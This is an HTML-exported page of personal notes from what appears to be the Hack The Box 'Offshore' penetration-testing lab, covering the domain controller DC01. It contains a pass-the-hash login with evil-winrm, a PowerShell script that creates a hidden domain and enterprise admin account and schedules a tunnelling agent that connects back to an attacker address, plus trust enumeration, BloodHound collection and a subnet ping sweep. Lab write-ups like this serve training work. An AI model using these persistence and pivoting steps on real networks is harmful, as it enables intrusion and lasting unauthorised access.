<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DC01 - 172.16.1.5</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>DC01 - 172.16.1.5</h1><br/><p><a href="Offshore--DC01_-_172.16.1.5_15.html#OFS-Flag15">Flag 16</a></p><p><a href="Offshore--DC01_-_172.16.1.5_15.html#OFS-PivotToDEVADMIN">Pivot point to DEV.ADMIN / 172.16.2.0/24 network</a></p><p><a href="Offshore--DC01_-_172.16.1.5_15.html#OFS-DEVADMINJoeCreds">Credentials for dev.admin/joe</a></p><p></p><p></p><p><code><span style="background-color:#000000;">└─$ evil-winrm -i 172.16.1.5 -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0                                 </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Evil-WinRM shell v3.4</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Info: Establishing connection to remote endpoint</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">*Evil-WinRM* PS C:\Users\iamtheadministrator\Documents&gt; type ..\Desktop\flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag16"></a>OFFSHORE{r3pl1cation_@ll0w_l1st}</p><p></p><p>This is where I setup my pivot to 172.16.2.0/24</p><p></p><p><a name="OFS-PivotToDEVADMIN"></a>I uploaded the ligolo-ng agent on the DC, created a domain administrator, created a bat file to run the agent and scheduled a task to run the bat file in the background so I didn&#39;t have to stay logged on.</p><p></p><p>To do this:</p><p><ol><li>create a .bat file with this line to run the agent with the connect arguments</li></ol></p><p><code><span style="background-color:#000000;">C:\temp\agent.exe -connect 10.10.16.94:443 -ignore-cert</span></code></p><p><ol><li>create a ps1 script to create a user, add it to the domain admins/enterprise admins group, and create/schedule a task to run your bat file with these creds every 30 seconds</li></ol></p><p><code><span style="background-color:#000000;">New-ADUser -Name &quot;agent&quot; -SamAccountName &quot;agent&quot; -AccountPassword (ConvertTo-SecureString &quot;password123!&quot; -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;agent&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Add-ADGroupMember -Identity &quot;Administrators&quot; -Members &quot;agent&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Add-ADGroupMember -Identity &quot;Enterprise Admins&quot; -Members &quot;agent&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$SecurePassword = ConvertTo-SecureString &quot;password123!&quot; -AsPlainText -Force</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$UserName = &quot;agent&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName, $SecurePassword</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$Password = $Credentials.GetNetworkCredential().Password </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$action = New-ScheduledTaskAction -Execute C:\temp\start_agent.bat </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">#$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Seconds (1*60))</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 1)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$principal = New-ScheduledTaskPrincipal -UserID &quot;agent&quot; -LogonType Password -RunLevel Highest</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$Task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$Task | Register-ScheduledTask -TaskName &#39;ScheduledTaskName&#39; -User &quot;agent&quot; -Password $Password</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$i = 30</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">while ($i -gt 0) {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    if ($i -eq 1) {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">        Write-Host &quot;Agent will connect in 1 second&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    } else {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">        Write-Host &quot;Agent will connect in $i seconds&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    }</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    Start-Sleep -Seconds 1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    $i--</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">}</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">if ((Get-ScheduledTask -TaskName &quot;ScheduledTaskName&quot;).State -eq &quot;Running&quot;) {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    Write-Host &quot;Agent connected successfully.&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">} else {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    Write-Host &quot;Agent couldn&#39;t connect.&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">}</span></code></p><p><ol><li>Evil-WinRM into the domain controller and run the commands to upload and run the files</li></ol></p><p><code><span style="background-color:#000000;">mkdir c:\temp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">upload /home/user/Downloads/ligolo-ng/pc_agents/agent.exe C:\temp\agent.exe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">upload /home/user/Downloads/ligolo-ng/pc_agents/start_agent.bat C:\temp\start_agent.bat</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">upload /home/user/Downloads/ligolo-ng/schedule_task.ps1 C:\temp\schedule_task.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">c:\temp\schedule_task.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code></p><p><img src="images/15-1.png" alt="images/15-1.png" /></p><p></p><p><img src="images/15-2.png" alt="images/15-2.png" /></p><p></p><p></p><p>Let&#39;s check for domain trusts from DC01 - you can use iamtheadministrator&#39;s hash to RDP into DC01 and do some commands... however, certain commands you will get “Server is not operational” error message.  To get around this, create your own domain admin.</p><p></p><p><code><span style="background-color:#000000;">New-ADUser -Name &quot;agent&quot; -SamAccountName &quot;agent&quot; -AccountPassword (ConvertTo-SecureString &quot;password123!&quot; -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;agent&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Add-ADGroupMember -Identity &quot;Administrators&quot; -Members &quot;agent&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Add-ADGroupMember -Identity &quot;Enterprise Admins&quot; -Members &quot;agent&quot;</span></code></p><p></p><p>We RDP with these credentials into DC01 and we are able to see domain trusts with PowerView</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; . .\PowerView.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Get-DomainTrust</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SourceName      : corp.local</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TargetName      : dev.ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustAttributes : FILTER_SIDS</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustDirection  : Bidirectional</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenCreated     : 6/9/2018 2:53:05 AM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenChanged     : 5/2/2023 7:09:49 AM</span></code></p><p></p><p>Also pull a Bloodhound dump for this domain</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; . .\SharpHound.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Invoke-BloodHound -domain dev.admin.offshore.com</span></code></p><p></p><p>Our next domain is dev.admin.offshore.com</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; ping dev.admin.offshore.com</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Pinging dev.admin.offshore.com [172.16.2.6] with 32 bytes of data:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Reply from 172.16.2.6: bytes=32 time&lt;1ms TTL=127</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Reply from 172.16.2.6: bytes=32 time=1ms TTL=127</span></code></p><p></p><p>We can see this is the 172.16.2.x network so let&#39;s pingsweep and see our hosts</p><p></p><p><code><span style="background-color:#000000;">└─$ cat pingsweep_172.16.2.sh </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">#!/bin/bash</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">for ip in 172.16.2.{1..254}; do</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  if ping -c 1 -W 1 &quot;$ip&quot; &gt;/dev/null; then</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    echo &quot;$ip&quot; &gt;&gt; 172.pingsweep.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  fi</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">done</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ cat 172.pingsweep.txt                         </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.2.6</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.2.102</span></code></p><p></p><p></p><p><a name="OFS-DEVADMINJoeCreds"></a>If we look at the dev.admin domain users in Bloodhound, we can see there is no password required for joe</p><p></p><p><img src="images/15-3.png" alt="images/15-3.png" /></p><p></p><p>If we spray joe we can see he&#39;s an administrator on WS03 so let&#39;s move on</p><p></p><p><img src="images/15-4.png" alt="images/15-4.png" /></p></div>
</body>
</html>
